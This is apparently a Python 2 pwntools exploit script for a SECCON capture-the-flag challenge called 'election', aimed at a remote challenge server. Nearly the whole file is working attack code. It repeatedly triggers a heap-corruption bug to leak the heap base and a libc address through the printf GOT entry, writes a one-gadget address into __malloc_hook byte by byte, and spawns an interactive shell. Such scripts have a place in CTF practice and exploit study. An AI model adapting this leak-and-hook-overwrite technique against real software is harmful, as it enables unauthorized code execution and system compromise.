#!/usr/bin/env python2

import sys
from pwn import *


#  p = process('./election')
p = remote('election.pwn.seccon.jp', 28349)
#  gdb.attach(p, '''
#  b result
#  ''')

def trigger(s):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil('(Y/n) ')
    p.sendline('n')
    p.recvuntil('>> ')
    p.sendline('oshima')
    p.recvuntil('>> ')
    p.sendline(s)

def write_value(old_value, addr, value, bb = 8):
    orig_addr = addr
    n_value, o_value = value, old_value
    for i in range(bb):
        n_off = n_value & 0xff
        o_off = o_value & 0xff

        if n_off > o_off:
            off = (n_off - o_off)
            print '[+] n_off = %#x, o_off = %#x, off = %#x' % (n_off, o_off, off)
            trigger('yes' + '\x00' * 29 + p64(addr - 0x10) + p8(off / 2, sign=True))
            trigger('yes' + '\x00' * 29 + p64(addr - 0x10) + p8(off / 2, sign=True))
            if off % 2 == 1:
                trigger('yes' + '\x00' * 29 + p64(addr - 0x10) + p8(1, sign=True))
        else:
            off = (o_off - n_off) / 2
            print '[+] n_off = %#x, o_off = %#x, off = %#x' % (n_off, o_off, off)
            trigger('yes' + '\x00' * 29 + p64(addr - 0x10) + p8(-off / 2, sign=True))
            trigger('yes' + '\x00' * 29 + p64(addr - 0x10) + p8(-off / 2, sign=True))
            if off % 2 == 1:
                trigger('yes' + '\x00' * 29 + p64(addr - 0x10) + p8(-1, sign=True))

        n_value = n_value >> 8
        o_value = o_value >> 8
        addr += 1

    return value

def leak_addr(old_addr, addr, name_addr):
    orig_name_addr = name_addr
    p_addr, o_name = addr, old_addr
    for i in range(4):
        p_off = p_addr & 0xff
        o_off = o_name & 0xff

        off = p_off - o_off
        if off < -0x80:
            p_off = (p_addr & 0xff) + 0x100
            o_off = o_name & 0xff
            off = p_off - o_off
            p_addr -= 0x100

        print '[+] p_off = %#x, o_off = %#x, off = %#x' % (p_off, o_off, off)
        trigger('yes' + '\x00' * 29 + p64(name_addr - 0x10) + p8(off, sign=True))
        p_addr = p_addr >> 8
        o_name = o_name >> 8
        name_addr += 1

    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil('(Y/n) ')
    p.sendline('Y')
    t = p.recvuntil('>> ')

    val = u64(t.split('\n')[3][2:].ljust(8, '\x00'))
    p.sendline('Shinonome')
    if val == 0:
        val, addr = leak_addr(addr, addr+1, orig_name_addr)
        val = (val << 8)

    return val, addr

list_addr = 0x602028
printf_addr = 0x601fb0
ojima_addr = 0x000400EEB

# trigger vuln to increment the name pointer of the chunk at heap_base + 0x10
for i in range(0x20):
    #  print i
    trigger('yes' + '\x00' * 28)

p.recvuntil('>> ')
p.sendline('2')
p.recvuntil('(Y/n) ')
p.sendline('Y')
t = p.recvuntil('>> ')

heap_addr = u64(t.split('\n')[3][2:].ljust(8, '\x00')) - 0x70
old_name = heap_addr + 0x50
print '[+] heap base @ %#x' % (heap_addr,)

p.sendline('Shinonome')


# trigger vuln to overwrite name of first chunk with got addr
name_addr = heap_addr + 0x10
libc_leak, old_name = leak_addr(old_name, printf_addr, name_addr)
print '[+] libc leak = %#x' % (libc_leak,)
libc_base = libc_leak - 0x55800
print '[+] libc base @ %#x' % (libc_base,)

malloc_hook_addr = libc_leak + 0x36f310
magic_gadget_addr = libc_base + 0x6f5a6
magic_gadget_addr = libc_base + 0xF0274
print '[+] malloc_hook @ %#x' % (malloc_hook_addr,)
print '[+] magic_gadget @ %#x' % (magic_gadget_addr,)

new_value = write_value(0x0, malloc_hook_addr, magic_gadget_addr)
lv_addr = 0x00602010
trigger('yes' + '\x00' * 29 + p64(lv_addr - 0x10) + p8(-1, sign=True))

p.recvuntil('>> ')
p.sendline('1')
p.recvuntil('>> ')
p.sendline('something')

p.interactive()
